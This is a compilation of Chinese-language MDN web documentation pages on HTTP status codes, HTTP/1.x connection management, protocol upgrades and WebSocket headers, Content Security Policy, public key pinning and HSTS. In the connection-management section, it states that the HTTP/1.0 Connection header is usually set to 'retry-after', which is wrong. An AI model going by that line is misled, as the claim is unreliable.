<!DOCTYPE html... (包含一个站点自定义404页面, 帮助用户找到丢失的资源)
```

### [响应状态码](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Session#响应状态码)

[HTTP 响应状态码](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status) 用来表示一个 HTTP 请求是否成功完成。响应被分为 5 种类型：信息型响应，成功响应，重定向，客户端错误和服务端错误。

- [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200): OK. 请求成功。
- [`301`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/301): Moved Permanently. 请求资源的 URI 已被改变。
- [`404`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/404): Not Found. 服务器无法找到请求的资源。

---

# HTTP/1.x 的连接管理

连接管理是一个 HTTP 的关键话题：打开和保持连接在很大程度上影响着网站和 Web 应用程序的性能。在 HTTP/1.x 里有多种模型：*短连接*, *长连接*, 和 *HTTP 流水线。*

HTTP 的传输协议主要依赖于 TCP 来提供从客户端到服务器端之间的连接。在早期，HTTP 使用一个简单的模型来处理这样的连接。这些连接的生命周期是短暂的：每发起一个请求时都会创建一个新的连接，并在收到应答时立即关闭。

这个简单的模型对性能有先天的限制：打开每一个 TCP 连接都是相当耗费资源的操作。客户端和服务器端之间需要交换好些个消息。当请求发起时，网络延迟和带宽都会对性能造成影响。现代浏览器往往要发起很多次请求(十几个或者更多)才能拿到所需的完整信息，证明了这个早期模型的效率低下。

有两个新的模型在 HTTP/1.1 诞生了。首先是长连接模型，它会保持连接去完成多次连续的请求，减少了不断重新打开连接的时间。然后是 HTTP 流水线模型，它还要更先进一些，多个连续的请求甚至都不用等待立即返回就可以被发送，这样就减少了耗费在网络延迟上的时间。

![Compares the performance of the three HTTP/1.x connection models: short-lived connections, persistent connections, and HTTP pipelining.](https://mdn.mozillademos.org/files/13727/HTTP1_x_Connections.png)

HTTP/2 新增了其它连接管理模型。

要注意的一个重点是 HTTP 的连接管理适用于两个连续节点之间的连接，如 [hop-by-hop](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#hbh)，而不是 [end-to-end](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#e2e)。当模型用于从客户端到第一个代理服务器的连接和从代理服务器到目标服务器之间的连接时(或者任意中间代理)效果可能是不一样的。HTTP 协议头受不同连接模型的影响，比如 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection) 和 [`Keep-Alive`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Keep-Alive)，就是 [hop-by-hop](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#hbh) 协议头，它们的值是可以被中间节点修改的。

一个相关的话题是HTTP连接升级，在这里，一个HTTP/1.1 连接升级为一个不同的协议，比如TLS/1.0，Websocket，甚至明文形式的HTTP/2。更多细节参阅[协议升级机制](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Protocol_upgrade_mechanism)。

---

## [短连接](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Connection_management_in_HTTP_1.x#短连接)

HTTP 最早期的模型，也是  HTTP/1.0 的默认模型，是短连接。每一个 HTTP 请求都由它自己独立的连接完成；这意味着发起每一个 HTTP 请求之前都会有一次 TCP 握手，而且是连续不断的。

TCP 协议握手本身就是耗费时间的，所以 TCP 可以保持更多的热连接来适应负载。短连接破坏了 TCP 具备的能力，新的冷连接降低了其性能。

这是 HTTP/1.0 的默认模型(如果没有指定 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection) 协议头，或者是值被设置为 `close`)。而在 HTTP/1.1 中，只有当 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection) 被设置为 `close` 时才会用到这个模型。

> 除非是要兼容一个非常古老的，不支持长连接的系统，没有一个令人信服的理由继续使用这个模型。

## [长连接](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Connection_management_in_HTTP_1.x#长连接)

短连接有两个比较大的问题：创建新连接耗费的时间尤为明显，另外 TCP 连接的性能只有在该连接被使用一段时间后(热连接)才能得到改善。为了缓解这些问题，*长连接* 的概念便被设计出来了，甚至在 HTTP/1.1 之前。或者这被称之为一个 *keep-alive* 连接。

一个长连接会保持一段时间，重复用于发送一系列请求，节省了新建 TCP 连接握手的时间，还可以利用 TCP 的性能增强能力。当然这个连接也不会一直保留着：连接在空闲一段时间后会被关闭(服务器可以使用 [`Keep-Alive`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Keep-Alive) 协议头来指定一个最小的连接保持时间)。

长连接也还是有缺点的；就算是在空闲状态，它还是会消耗服务器资源，而且在重负载时，还有可能遭受 [DoS attacks](https://developer.mozilla.org/zh-CN/docs/Glossary/DOS_attack) 攻击。这种场景下，可以使用非长连接，即尽快关闭那些空闲的连接，也能对性能有所提升。

HTTP/1.0 里默认并不使用长连接。把 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection) 设置成 `close` 以外的其它参数都可以让其保持长连接，通常会设置为 `retry-after。`

在 HTTP/1.1 里，默认就是长连接的，协议头都不用再去声明它(但我们还是会把它加上，万一某个时候因为某种原因要退回到 HTTP/1.0 呢)。

## [HTTP 流水线](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Connection_management_in_HTTP_1.x#http_流水线)

> HTTP 流水线在现代浏览器中并**不是默认被启用的**：

- Web 开发者并不能轻易的遇见和判断那些搞怪的[代理服务器](https://en.wikipedia.org/wiki/Proxy_server)的各种莫名其妙的行为。
- 正确的实现流水线是复杂的：传输中的资源大小，多少有效的 [RTT](https://en.wikipedia.org/wiki/Round-trip_delay_time) 会被用到，还有有效带宽，流水线带来的改善有多大的影响范围。不知道这些的话，重要的消息可能被延迟到不重要的消息后面。这个重要性的概念甚至会演变为影响到页面布局！因此 HTTP 流水线在大多数情况下带来的改善并不明显。
- 流水线受制于 [HOL](https://en.wikipedia.org/wiki/Head-of-line_blocking) 问题。

由于这些原因，流水线已经被更好的算法给代替，如 *multiplexing*，已经用在 HTTP/2。

默认情况下，[HTTP](https://developer.mozilla.org/en-US/HTTP) 请求是按顺序发出的。下一个请求只有在当前请求收到应答过后才会被发出。由于会受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。

流水线是在同一条长连接上发出连续的请求，而不用等待应答返回。这样可以避免连接延迟。理论上讲，性能还会因为两个 HTTP 请求有可能被打包到一个 TCP 消息包中而得到提升。就算 HTTP 请求不断的继续，尺寸会增加，但设置 TCP 的 [MSS](https://en.wikipedia.org/wiki/Maximum_segment_size)(Maximum Segment Size) 选项，仍然足够包含一系列简单的请求。

并不是所有类型的 HTTP 请求都能用到流水线：只有 [idempotent](https://developer.mozilla.org/zh-CN/docs/Glossary/Idempotent) 方式，比如 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)、[`HEAD`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD)、[`PUT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PUT) 和 [`DELETE`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/DELETE) 能够被安全的重试：如果有故障发生时，流水线的内容要能被轻易的重试。

今天，所有遵循 HTTP/1.1 的代理和服务器都应该支持流水线，虽然实际情况中还是有很多限制：一个很重要的原因是，目前没有现代浏览器默认启用这个特性。

---

## [域名分片](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Connection_management_in_HTTP_1.x#域名分片)

> 除非你有紧急而迫切的需求，不要使用这一过时的技术，升级到 HTTP/2 就好了。在 HTTP/2 里，做域名分片就没必要了：HTTP/2 的连接可以很好的处理并发的无优先级的请求。域名分片甚至会影响性能。大多数 HTTP/2 的实现还会使用一种称作[连接凝聚](https://daniel.haxx.se/blog/2016/08/18/http2-connection-coalescing/)的技术去尝试合并被分片的域名。

作为 HTTP/1.x 的连接，请求是序列化的，哪怕本来是无序的，在没有足够庞大可用的带宽时，也无从优化。一个解决方案是，浏览器为每个域名建立多个连接，以实现并发请求。曾经默认的连接数量为 2 到 3 个，现在比较常用的并发连接数已经增加到 6 条。如果尝试大于这个数字，就有触发服务器 DoS 保护的风险。

如果服务器端想要更快速的响应网站或应用程序的应答，它可以迫使客户端建立更多的连接。例如，不要在同一个域名下获取所有资源，假设有个域名是 `www.example.com`，我们可以把它拆分成好几个域名：`www1.example.com`、`www2.example.com`、`www3.example.com`。所有这些域名都指向同一台服务器，浏览器会同时为每个域名建立 6 条连接(在我们这个例子中，连接数会达到 18 条)。这一技术被称作域名分片。

![img](https://mdn.mozillademos.org/files/13783/HTTPSharding.png)

---

# 协议升级机制

[HTTP协议](https://developer.mozilla.org/en-US/HTTP) 提供了一种特殊的机制，这一机制允许将一个已建立的连接升级成新的、不相容的协议。这篇指南涵盖了其工作原理和使用场景。

通常来说这一机制总是由客户端发起的 （不过也有例外，比如说可以由服务端发起[升级到传输层安全协议（TLS）](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Protocol_upgrade_mechanism#server-initiated_upgrade_to_tls)）， 服务端可以选择是否要升级到新协议。借助这一技术，连接可以以常用的协议启动（如HTTP/1.1），随后再升级到HTTP2甚至是WebSockets.

> 注意：HTTP/2 明确禁止使用此机制，这个机制只属于HTTP/1.1

## [升级HTTP/1.1的链接](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Protocol_upgrade_mechanism#升级http1.1的链接)

协议升级请求总是由客户端发起的；暂时没有服务端请求协议更改的机制。当客户端试图升级到一个新的协议时，可以先发送一个普通的请求（[`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)，[`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST)等），不过这个请求需要进行特殊配置以包含升级请求。

特别这个请求需要添加两项额外的header：

- `Connection: Upgrade`

  设置 `Connection` 头的值为 `"Upgrade"` 来指示这是一个升级请求.

- `Upgrade: *protocols*`

  `Upgrade` 头指定一项或多项协议名，按优先级排序，以逗号分隔。

一个典型的包含升级请求的例子差不多是这样的：

```http
GET /index.html HTTP/1.1
Host: www.example.com
Connection: upgrade
Upgrade: example/1, foo/2
```

根据之前的请求的协议，可能需要其他头部信息，例如：从HTTP/1.1升级到[WebSocket](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket) 允许配置有关 WebSocket 连接的头部详细信息，以及在连接时提供一定程度的安全性。查看 [升级到WebSocket协议的连接](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Protocol_upgrade_mechanism#升级到websocket协议的连接) 获取更多信息。

如果服务器决定升级这次连接，就会返回一个 [`101 Switching Protocols`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/101) 响应状态码，和一个要切换到的协议的头部字段Upgrade。 如果服务器没有（或者不能）升级这次连接，它会忽略客户端发送的 `"Upgrade` 头部字段，返回一个常规的响应：例如一个[`200 OK`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200)).

服务在发送 [`101`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/101) 状态码之后，就可以使用新的协议，并可以根据需要执行任何其他协议指定的握手。实际上，一旦这次升级完成了，连接就变成了双向管道。并且可以通过新协议完成启动升级的请求。

由HTTP/1.1请求建立的连接可以升级为HTTP/2协议的连接，但是反过来不可以。事实上HTTP/2已经不再支持101状态码了，也不再支持任何连接升级机制。

## [升级机制的常用场合](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Protocol_upgrade_mechanism#升级机制的常用场合)

此处将介绍最常用到 `Upgrade` header的场合。

### [升级到WebSocket协议的连接](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Protocol_upgrade_mechanism#升级到websocket协议的连接)

至今为止最经常会需要升级一个HTTP连接的场合就是使用WebSocket。当你用 [WebSocket API](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket) 以及其他大部分实现WebSockets的库去建立WebSocket连接时，基本上都不用操心升级的过程，因为这些API已经实现了这一步。比如，用如下API打开一个WebSocket连接：

```js
webSocket = new WebSocket("ws://destination.server.ext", "optionalProtocol");
```

[`WebSocket()`](https://developer.mozilla.org/zh-CN/docs/Web/API/WebSocket/WebSocket) 构造函数已经自动完成了发送初始 HTTP/1.1 请求，处理握手及升级过程。

你也可以用 `"wss://"` 地址格式来打开安全的WebSocket连接。

如果想要自己重头实现WebSocket 连接，就必须要处理握手和升级过程。在创建初始HTTP/1.1会话之后你需要发送另一个HTTP标准请求，但在headers中要带上[Upgrade (en-US)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Upgrade) and [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection)，也就是：

```http
Connection: Upgrade
Upgrade: websocket
```

### [WebSocket 专有的 headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Protocol_upgrade_mechanism#websocket_专有的_headers)

以下headers是在WebSocket升级过程中会出现的。除了 [Upgrade (en-US)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Upgrade) 和 [`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection) headers, 其他的一般浏览器和服务器都会在交互过程中处理好。

#### [`Sec-WebSocket-Extensions`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Sec-WebSocket-Extensions)

用于指定一个或多个请求服务器使用的协议级WebSocket扩展。允许在一个请求中使用多个Sec-WebSocket-Extension头，结果跟在一个头文件中包含了所有列出的扩展一样。

```
Sec-WebSocket-Extensions: extensions
```

- `extensions`

  指需要(或支持)的扩展的逗号分隔列表。这些值来自[IANA WebSocket 扩展名注册表](https://www.iana.org/assignments/websocket/websocket.xml#extension-name)。带参数的扩展使用分号表示。

例如：

```
Sec-WebSocket-Extensions: superspeed, colormode; depth=16
```

---

# 内容安全策略( CSP )

内容安全策略  ([CSP](https://developer.mozilla.org/zh-CN/docs/Glossary/CSP)) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 ([XSS (en-US)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。

CSP 被设计成完全向后兼容（除CSP2 在向后兼容有明确提及的不一致; 更多细节查看[这里](https://www.w3.org/TR/CSP2) 章节1.1）。不支持CSP的浏览器也能与实现了CSP的服务器正常合作，反之亦然：不支持 CSP 的浏览器只会忽略它，正常运行，默认为网页内容使用标准的同源策略。如果网站不提供 CSP 头部，浏览器也使用标准的[同源策略](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)。

为使CSP可用, 你需要配置你的网络服务器返回  [`Content-Security-Policy`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy) HTTP头部 ( 有时你会看到一些关于`X-Content-Security-Policy`头部的提法, 那是旧版本，你无须再如此指定它)。

除此之外, <meta>元素也可以被用来配置该策略, 例如

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```

---

## [威胁](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#威胁)

### [跨站脚本攻击](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#跨站脚本攻击)

CSP 的主要目标是减少和报告 XSS 攻击 ，XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方。

CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。**一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (**包括内联脚本和HTML的事件处理属性)。

作为一种终极防护形式，始终不允许执行脚本的站点可以选择全面禁止脚本执行。

### [数据包嗅探攻击](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#数据包嗅探攻击)

除限制可以加载内容的域，服务器还可指明哪种协议允许使用；比如 (从理想化的安全角度来说)，服务器可指定所有内容必须通过HTTPS加载。一个完整的数据安全传输策略不仅强制使用HTTPS进行数据传输，也为所有的cookie标记安全标识 [cookies with the secure flag](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)，并且提供自动的重定向使得HTTP页面导向HTTPS版本。网站也可以使用  [`Strict-Transport-Security`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security) HTTP头部确保连接它的浏览器只使用加密通道**。**

---

## [使用 CSP](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#使用_csp)

配置内容安全策略涉及到添加 [`Content-Security-Policy`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy) HTTP头部到一个页面，并配置相应的值，以控制用户代理（浏览器等）可以为该页面获取哪些资源。比如一个可以上传文件和显示图片页面，应该允许图片来自任何地方，但限制表单的action属性只可以赋值为指定的端点。**一个经过恰当设计的内容安全策略应该可以有效的保护页面免受跨站脚本攻击**。本文阐述如何恰当的构造这样的头部，并提供了一些例子。

### [制定策略](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#制定策略)

你可以使用  [`Content-Security-Policy`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy) HTTP头部 来指定你的策略，像这样:

```
Content-Security-Policy: policy
```

policy参数是一个包含了各种描述你的CSP策略指令的字符串。

### [描述策略](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#描述策略)

一个策略由一系列策略指令所组成，每个策略指令都描述了一个针对某个特定类型资源以及生效范围的策略。你的策略应当包含一个[`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src)策略指令，在其他资源类型没有符合自己的策略时应用该策略(有关完整列表查看[`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) )。一个策略可以包含 [`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) 或者 [script-src (en-US)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) 指令来防止内联脚本运行, 并杜绝`eval()`的使用。 一个策略也可包含一个 [`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) 或  [style-src (en-US)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src) 指令去限制来自一个 `<style>` 元素或者style属性的內联样式。

## [示例：常见用例](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#示例：常见用例)

这一部分提供了一些常用的安全策略方案示例。

### [示例 1](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#示例_1)

一个网站管理者想要所有内容均来自站点的同一个源 (不包括其子域名)

```
Content-Security-Policy: default-src 'self'
```

### [示例 2](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#示例_2)

一个网站管理者允许内容来自信任的域名及其子域名 (域名不必须与CSP设置所在的域名相同)

```
Content-Security-Policy: default-src 'self' *.trusted.com
```

### [示例 3](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#示例_3)

一个网站管理者允许网页应用的用户在他们自己的内容中包含来自任何源的图片, 但是限制音频或视频需从信任的资源提供者(获得)，所有脚本必须从特定主机服务器获取可信的代码.

```
Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com
```

在这里，各种内容默认仅允许从文档所在的源获取, 但存在如下例外:

- 图片可以从任何地方加载(注意 "*" 通配符)。
- 多媒体文件仅允许从 media1.com 和 media2.com 加载(不允许从这些站点的子域名)。
- 可运行脚本仅允许来自于userscripts.example.com。

### [示例 4](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#示例_4)

一个线上银行网站的管理者想要确保网站的所有内容都要通过SSL方式获取，以避免攻击者窃听用户发出的请求。

```
Content-Security-Policy: default-src https://onlinebanking.jumbobank.com
```

该服务器仅允许通过HTTPS方式并仅从`onlinebanking.jumbobank.com`域名来访问文档。

### [示例 5](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#示例_5)

 一个在线邮箱的管理者想要允许在邮件里包含HTML，同样图片允许从任何地方加载，但不允许JavaScript或者其他潜在的危险内容(从任意位置加载)。

```
Content-Security-Policy: default-src 'self' *.mailsite.com; img-src *
```

 注意这个示例并未指定[script-src (en-US)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)。在此CSP示例中，站点通过 [`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) 指令的对其进行配置，这也同样意味着脚本文件仅允许从原始服务器获取。

---

## [启用违例报告](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#启用违例报告)

默认情况下，违规报告并不会发送。为启用发送违规报告，你需要指定 [report-uri (en-US)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri) 策略指令，并提供至少一个URI地址去递交报告：

```
Content-Security-Policy: default-src 'self'; report-uri http://reportcollector.example.com/collector.cgi
```

然后你需要设置你的服务器能够接收报告，使其能够以你认为恰当的方式存储并处理这些报告。

## [违例报告的语法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#违例报告的语法)

作为报告的JSON对象报告包含了以下数据：

- `document-uri`

  发生违规的文档的URI。

- `referrer`

  违规发生处的文档引用（地址）。

- `blocked-uri`

  被CSP阻止的资源URI。如果被阻止的URI来自不同的源而非文档URI，那么被阻止的资源URI会被删减，仅保留协议，主机和端口号。

- `violated-directive`

  违反的策略名称。

- `original-policy`

  在 `Content-Security-Policy` HTTP 头部中指明的原始策略。

## [违例报告样本](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP#违例报告样本)

我们假设页面位于 `http://example.com/signup.html`。它使用如下策略，该策略禁止任何资源的加载，除了来自`cdn.example.com的样式表。`

```
Content-Security-Policy: default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports
```

 `signup.html` 的HTML像这样：

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Sign Up</title>
    <link rel="stylesheet" href="css/style.css">
  </head>
  <body>
    ... Content ...
  </body>
</html>
```

你能看出其中错误吗？样式表仅允许加载自`cdn.example.com，`然而该页面企图从自己的源 (`http://example.com`)加载。当该文档被访问时，一个兼容CSP的浏览器将以POST请求的形式发送违规报告到 `http://example.com/_/csp-reports`，内容如下：

```json
{
  "csp-report": {
    "document-uri": "http://example.com/signup.html",
    "referrer": "",
    "blocked-uri": "http://example.com/css/style.css",
    "violated-directive": "style-src cdn.example.com",
    "original-policy": "default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports"
  }
}
```

如你所见，该报告在`blocked-uri字段`中包含了违规资源的完整路径 ，但情况并非总是如此。比如，当signup.html试图从 [`http://anothercdn.example.com/stylesheet.css`](http://anothercdn.example.com/stylesheet.css)加载CSS时，浏览器将不会包含完整路径，而只会保留源路径 (`http://anothercdn.example.com`)。CSP技术规范小组对此古怪行为给出了[解释](https://www.w3.org/TR/CSP/#violation-reports)。大体上说，这样是为了防止泄露跨域资源的敏感信息。

---

# HTTP Public Key Pinning (HPKP)

HTTP公钥锁定（HPKP）是一种安全功能，它告诉Web客户端将特定加密公钥与某个Web服务器相关联，以降低使用伪造证书进行MITM攻击的风险。

为确保TLS会话中使用的服务器公钥的真实性，此公钥将包装到X.509证书中，该证书通常由证书颁发机构（CA）签名。诸如浏览器之类的Web客户端信任许多这些CA，它们都可以为任意域名创建证书。如果攻击者能够攻击单个CA，则他们可以对各种TLS连接执行MITM攻击。 HPKP可以通过告知客户端哪个公钥属于某个Web服务器来规避HTTPS协议的这种威胁。

HPKP是首次使用信任（TOFU）技术。 Web服务器第一次通过特殊的HTTP标头告诉客户端哪些公钥属于它，客户端会在给定的时间段内存储此信息。当客户端再次访问服务器时，它希望证书链中至少有一个证书包含一个公钥，其指纹已通过HPKP已知。如果服务器提供未知的公钥，则客户端应向用户发出警告。

Firefox和Chrome禁用固定主机的引脚验证，其验证的证书链终止于用户定义的信任锚（而不是内置信任锚）。 这意味着对于导入自定义根证书的用户，将忽略所有固定违规。

## [启用 HPKP](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Public_Key_Pinning#启用_hpkp)

要为您的站点启用此功能，您需要在通过HTTPS访问站点时返回Public-Key-Pins HTTP标头：

```
Public-Key-Pins: pin-sha256="base64=="; max-age=expireTime [; includeSubDomains][; report-uri="reportURI"]
```

- `pin-sha256`

  引用的字符串是Base64编码的主题公钥信息（SPKI）指纹。 可以为不同的公钥指定多个引脚。 某些浏览器将来可能允许使用其他哈希算法而不是SHA-256。 请参阅下文，了解如何从证书或密钥文件中提取此信息。

- `max-age`

  浏览器应记住仅使用其中一个已定义的密钥访问此站点的时间（以秒为单位）。

- `includeSubDomains` 可选

  如果指定了此可选参数，则此规则也适用于所有站点的子域。

- `report-uri` 可选

  如果指定了此可选参数，则会将引脚验证失败报告给给定的URL。

> **注意** ：当前规范要求包含第二个用于备份密钥的引脚，该引脚尚未在生产中使用。 这允许更改服务器的公钥，而不会破坏已经记下引脚的客户端的可访问性。 例如，当前一个密钥被泄露时，这很重要。

### [提取Base64编码的公钥信息](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Public_Key_Pinning#提取base64编码的公钥信息)

**注意:**虽然下面的示例显示了如何在服务器证书上设置引脚，但建议将引脚放在颁发服务器证书的CA的中间证书上，以简化证书续订和轮换。

 首先，您需要从证书或密钥文件中提取公钥信息，并使用Base64对其进行编码。

以下命令将帮助您从密钥文件，证书签名请求或证书中提取Base64编码信息。

```bash
openssl rsa -in my-rsa-key-file.key -outform der -pubout | openssl dgst -sha256 -binary | openssl enc -base64

openssl ec -in my-ecc-key-file.key -outform der -pubout | openssl dgst -sha256 -binary | openssl enc -base64

openssl req -in my-signing-request.csr -pubkey -noout | openssl pkey -pubin -outform der | openssl dgst -sha256 -binary | openssl enc -base64

openssl x509 -in my-certificate.crt -pubkey -noout | openssl pkey -pubin -outform der | openssl dgst -sha256 -binary | openssl enc -base64
```

以下命令将提取网站的Base64编码信息。

```
openssl s_client -servername www.example.com -connect www.example.com:443 | openssl x509 -pubkey -noout | openssl pkey -pubin -outform der | openssl dgst -sha256 -binary | openssl enc -base64
```

### [HPKP 头示例](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Public_Key_Pinning#hpkp_头示例)

```
Public-Key-Pins:
  pin-sha256="cUPcTAZWKaASuYWhhneDttWpY3oBAkE3h2+soZS7sWs=";
  pin-sha256="M8HztCzM3elUxkcjR2S5P4hhyBNf6lHkmjAHKhpGPWE=";
  max-age=5184000; includeSubDomains;
  report-uri="https://www.example.org/hpkp-report"
```

在此示例中，pin-sha256 =“cUPcTAZWKaASuYWhhneDttWpY3oBAkE3h2 + soZS7sWs =”固定服务器在生产中使用的公钥。 第二个引脚声明引脚-sha256 =“M8HztCzM3elUxkcjR2S5P4hhyBNf6lHkmjAHKhpGPWE =”也固定备份密钥。 max-age = 5184000告诉客户端将此信息存储两个月，根据IETF RFC，这是一个合理的时间限制。 此密钥固定也适用于所有子域，includeSubDomains声明告知。 最后，report-uri =“https://www.example.net/hpkp-report”解释了报告引脚验证失败的位置。

#### Apache

Adding a line similar to the following to your webserver's config will enable HPKP on your Apache. This requires `mod_headers` enabled.

```
Header always set Public-Key-Pins "pin-sha256=\"base64+primary==\"; pin-sha256=\"base64+backup==\"; max-age=5184000; includeSubDomains"
```

#### Nginx

Adding the following line and inserting the appropriate `pin-sha256="..."` values will enable HPKP on your nginx. This requires the `ngx_http_headers_module.`

```
add_header Public-Key-Pins 'pin-sha256="base64+primary=="; pin-sha256="base64+backup=="; max-age=5184000; includeSubDomains' always;
```

---

In this article[语法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#语法)[指令](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#指令)[描述](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#描述)[预加载 HSTS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#预加载_hsts)[示例](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#示例)[规范](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#规范)[浏览器兼容](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#浏览器兼容)[查看更多](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#查看更多)

# HTTP Strict Transport Security

` HTTP Strict Transport Security`（通常简称为[HSTS](https://developer.mozilla.org/zh-CN/docs/Glossary/HSTS)）是一个安全功能，它告诉浏览器只能通过HTTPS访问当前资源，而不是[HTTP](https://developer.mozilla.org/en-US/HTTP)。

## [语法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#语法)

```
Strict-Transport-Security: max-age=<expire-time>
Strict-Transport-Security: max-age=<expire-time>; includeSubDomains
Strict-Transport-Security: max-age=<expire-time>; preload
```

## [指令](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#指令)

- `max-age=<expire-time>`

  设置在浏览器收到这个请求后的<expire-time>秒的时间内凡是访问这个域名下的请求都使用HTTPS请求。

- `includeSubDomains` 可选

  如果这个可选的参数被指定，那么说明此规则也适用于该网站的所有子域名。

- `preload` 可选

  查看 [预加载 HSTS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#预加载_hsts) 获得详情。不是标准的一部分。

